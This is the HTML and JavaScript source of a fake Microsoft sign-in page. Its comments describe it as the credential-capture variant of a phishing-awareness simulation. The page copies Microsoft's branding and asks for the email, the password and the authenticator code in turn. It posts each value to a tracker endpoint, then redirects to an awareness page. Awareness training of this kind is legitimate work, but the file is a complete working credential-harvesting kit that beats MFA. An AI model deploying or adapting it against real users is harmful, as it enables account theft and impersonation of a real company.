<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to your account</title>
<link rel="stylesheet" href="assets/style.css">
</head>
<body>
<div class="signin-shell">
  <div class="signin-card" data-step="email">
    <div class="signin-logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24" width="108" height="24" aria-label="Microsoft"><g><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="11" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></g><text x="27" y="17" fill="#737373" font-family="'Segoe UI', system-ui, sans-serif" font-size="15" font-weight="400">Microsoft</text></svg></div>
    <div class="signin-title">Sign in</div>
    <form id="step-email" autocomplete="off">
      <input type="email" name="email" class="signin-field" placeholder="Email, phone, or Skype" required>
      <div class="signin-meta"><a href="#">Can't access your account?</a></div>
      <div class="signin-actions">
        <button type="button" class="signin-btn secondary" onclick="history.back()">Back</button>
        <button type="submit" class="signin-btn">Next</button>
      </div>
    </form>

    <form id="step-password" autocomplete="off" style="display:none">
      <div class="signin-account-chip"><span class="dot"></span><span id="email-echo">user@example.com</span></div>
      <div class="signin-title">Enter password</div>
      <input type="password" name="password" class="signin-field" placeholder="Password" required>
      <div class="signin-meta"><a href="#">Forgot my password</a></div>
      <div class="signin-actions"><button type="submit" class="signin-btn">Sign in</button></div>
    </form>

    <form id="step-2fa" autocomplete="off" style="display:none">
      <div class="signin-account-chip"><span class="dot"></span><span id="email-echo-2">user@example.com</span></div>
      <div class="signin-title">Verify your identity</div>
      <p class="signin-sub">Enter the code displayed in your authenticator app.</p>
      <input type="text" name="code_2fa" class="signin-field code-box" inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" placeholder="000000" required>
      <div class="signin-actions"><button type="submit" class="signin-btn">Verify</button></div>
    </form>
  </div>
</div>
<div class="signin-footer"><span>Terms of use &middot; Privacy &amp; cookies &middot; &hellip;</span></div>

<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
<script>
(function () {
  // CAPTURE variant (authorised simulation): records email + password (+ OTP
  // when enabled) to the tracker, then redirects to a built-in awareness page
  // (learn.html) — "Ooops, du wurdest gephisht" — instead of the real login.
  //
  // URL params (set by the phishing mail's CTA):
  //   rid / trackerId  — tracker context (also read from window.__taphish_tracker)
  //   email | login_hint — pre-fills the account and jumps straight to the
  //                        password step, mirroring M365's real login_hint flow
  //   mfa=0            — skip the OTP step for this campaign (default: keep OTP)
  var POST_URL = "{{POST_URL}}";
  var Q = new URLSearchParams(location.search);
  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
  var captureMfa   = Q.get("mfa") !== "0"; // OTP step on by default; mfa=0 disables
  function trackerCtx() {
    var t = window.__taphish_tracker || {};
    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
  }
  function post(payload, cb) {
    if (!POST_URL) { cb(); return; }
    fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
  }
  var formEmail = document.getElementById("step-email");
  var formPwd   = document.getElementById("step-password");
  var form2fa   = document.getElementById("step-2fa");
  var emailVal = "", pwdVal = "";

  function echoEmail() {
    document.getElementById("email-echo").textContent = emailVal;
    document.getElementById("email-echo-2").textContent = emailVal;
  }
  function gotoPwd() { echoEmail(); formEmail.style.display = "none"; formPwd.style.display = "block"; }
  function redirectAware(ctx) {
    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
  }

  formEmail.addEventListener("submit", function (e) {
    e.preventDefault();
    emailVal = formEmail.elements["email"].value;
    var ctx = trackerCtx();
    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { gotoPwd(); });
  });
  formPwd.addEventListener("submit", function (e) {
    e.preventDefault();
    pwdVal = formPwd.elements["password"].value;
    var ctx = trackerCtx();
    post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
      if (captureMfa) { formPwd.style.display = "none"; form2fa.style.display = "block"; }
      else { redirectAware(ctx); }
    });
  });
  form2fa.addEventListener("submit", function (e) {
    e.preventDefault();
    var code = form2fa.elements["code_2fa"].value;
    var ctx = trackerCtx();
    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
  });

  // Pre-fill from the mail link: record the click->account, then show the
  // password step directly (the email input is never displayed). Mirrors a real
  // M365 link that already carries the recipient address.
  if (prefillEmail) {
    emailVal = prefillEmail;
    var ctx0 = trackerCtx();
    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx0.rid, sess_id: ctx0.sess_id, trackerId: ctx0.trackerId }, function () { gotoPwd(); });
  }
})();
</script>
</body>
</html>
